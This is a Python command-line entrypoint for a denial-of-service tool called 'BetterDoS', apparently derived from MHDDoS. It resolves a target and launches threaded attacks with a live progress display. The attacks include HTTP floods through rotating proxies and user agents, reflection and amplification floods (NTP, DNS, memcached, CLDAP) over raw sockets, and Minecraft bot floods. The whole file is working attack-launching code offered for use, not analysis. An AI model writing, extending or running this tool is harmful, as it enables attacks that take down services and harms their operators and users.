#!/usr/bin/env python3
"""BetterDoS — thin CLI entrypoint."""

from contextlib import suppress
from logging import shutdown, DEBUG
from pathlib import Path
from socket import AF_INET, SOCK_STREAM, gethostbyname, socket
from sys import argv
from sys import exit as _exit
from threading import Event
from time import sleep, time
from typing import Any

from PyRoxy import ProxyUtiles
from PyRoxy import Tools as ProxyTools
from yarl import URL

from betterdos.core import (BYTES_SEND, REQUESTS_SENT, ROOT_DIR, Methods, Tools,
                            bcolors, con, exit, logger, RUN_ID)
from betterdos.advisor import MethodAdvisor
from betterdos.console import ToolsConsole
from betterdos.layer4 import Layer4
from betterdos.layer7 import HttpFlood, BOMBARDIER_PATH
from betterdos.minecraft import Minecraft
from betterdos.output import banner, print_attack_status, usage
from betterdos.proxy import handleProxyList


def main():
    banner()

    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            if one == "ADVISE":
                MethodAdvisor.advise(argv[2].strip())
                shutdown()
                _exit(0)

            if one == "AUTO":
                auto_threads = int(argv[3]) if len(argv) > 3 else 5
                auto_duration = int(argv[4]) if len(argv) > 4 else 10
                auto_rpc = int(argv[5]) if len(argv) > 5 else 5
                auto_proxy_ty = int(argv[6]) if len(argv) > 6 else 0
                auto_proxy_file = argv[7].strip() if len(argv) > 7 else ""
                MethodAdvisor.auto(argv[2].strip(), auto_threads,
                                   auto_duration, auto_rpc,
                                   auto_proxy_ty, auto_proxy_file)
                shutdown()
                _exit(0)

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host

                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                proxy_li = Path(ROOT_DIR / "files/proxies/" / argv[5].strip())
                useragent_li = Path(ROOT_DIR / "files/useragent.txt")
                referers_li = Path(ROOT_DIR / "files/referers.txt")
                proxies: Any = set()

                if method == "BOMB":
                    assert (
                        BOMBARDIER_PATH.exists()
                        or BOMBARDIER_PATH.with_suffix('.exe').exists()
                    ), (
                        "Install bombardier: "
                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                    )

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist ")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist ")

                uagents = {a.strip() for a in useragent_li.read_text().splitlines() if a.strip()}
                referers = {a.strip() for a in referers_li.read_text().splitlines() if a.strip()}

                if not uagents: exit("Empty Useragent File ")
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Thread is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Request Pre Connection) is higher than 100")

                proxies = handleProxyList(con, proxy_li, proxy_ty, threads, url)
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)
                port = target.port
                target = target.host

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', target, str(e))

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                if method in Methods.LAYER4_AMP:
                    logger.warning("this method need spoofable servers please check")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(ROOT_DIR / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            proxy_li = Path(ROOT_DIR / "files/proxies" / argv[6].strip())
                            proxies = handleProxyList(con, proxy_li, proxy_ty, threads)
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b'\x00'))
                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                        if 47 < protocolid > 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies, protocolid).start()

            # ── Attack progress loop ──────────────────────────────────
            logger.info(
                f"{bcolors.WARNING}[run:{RUN_ID}] Attack Started → "
                f"{bcolors.OKBLUE}{target or url.host}{bcolors.WARNING} "
                f"method={bcolors.OKBLUE}{method}{bcolors.WARNING} "
                f"duration={bcolors.OKBLUE}{timer}s{bcolors.WARNING} "
                f"threads={bcolors.OKBLUE}{threads}{bcolors.RESET}")
            event.set()
            ts = time()
            end_ts = ts + timer
            while time() < end_ts:
                now = time()
                pps = int(REQUESTS_SENT)
                bps = int(BYTES_SEND)
                elapsed = now - ts
                print_attack_status(
                    target or url.host,
                    port or (url.port or 80),
                    method, pps, bps, elapsed, timer)
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            print()  # newline after progress bar
            event.clear()
            exit()

        usage(argv[0])


if __name__ == '__main__':
    main()
